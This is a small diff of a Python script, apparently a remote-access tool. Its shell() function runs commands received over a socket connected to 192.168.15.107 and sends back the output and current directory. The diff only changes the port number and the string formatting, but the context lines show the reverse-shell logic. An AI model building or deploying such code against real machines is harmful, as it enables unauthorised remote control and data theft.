@@ -5,7 +5,7 @@ from tkinter import *
 import threading
 
 host = "192.168.15.107"
-port = 3333
+port = 4213
 buffer_size = 1024
 
 s = socket.socket()
@@ -127,7 +127,7 @@ def shell():
             output = subprocess.getoutput(cmd)
         
         cwd = os.getcwd()
-        message = f"{output}{SEPARATOR}{cwd}"
+        message = output + SEPARATOR + cwd
         send_data(message.encode())
 
     os.chdir(initial_dir)
